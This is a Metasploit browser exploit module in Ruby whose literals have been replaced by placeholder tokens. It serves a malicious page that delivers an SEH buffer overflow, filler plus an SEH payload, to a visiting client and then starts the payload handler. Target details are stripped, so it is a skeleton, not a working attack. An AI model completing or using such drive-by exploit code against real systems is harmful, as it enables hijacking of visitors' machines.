require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = GreatRanking include Msf :: Exploit :: Remote :: HttpServer :: HTML include Msf :: Exploit :: Seh def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > <str> , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > <str> , } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <hex> } ] , [ <str> , { <str> = > <hex> } ] , [ <str> , { <str> = > <hex> } ] , ] , <str> = > <str> , <str> = > <int> ) ) end def on_request_uri ( cli , request ) return if ( ( p = regenerate_payload ( cli ) ) == nil ) vname = rand_text_alpha ( rand ( <int> ) + <int> ) vurl = rand_text_alpha ( rand ( <int> ) + <int> ) vhostName = rand_text_alpha ( rand ( <int> ) + <int> ) vlocalFile = rand_text_alpha ( rand ( <int> ) + <int> ) vMD5 = rand_text_alpha ( rand ( <int> ) + <int> ) filler = rand_text_alpha ( <int> ) seh = generate_seh_payload ( target . ret ) sploit = filler + seh content = <str> vname <str> vname <str> vurl <str> vhostName <str> vlocalFile <str> sploit <str> vMD5 <str> print_status ( <str> self . name <str> ) send_response_html ( cli , content ) handler ( cli ) end end 
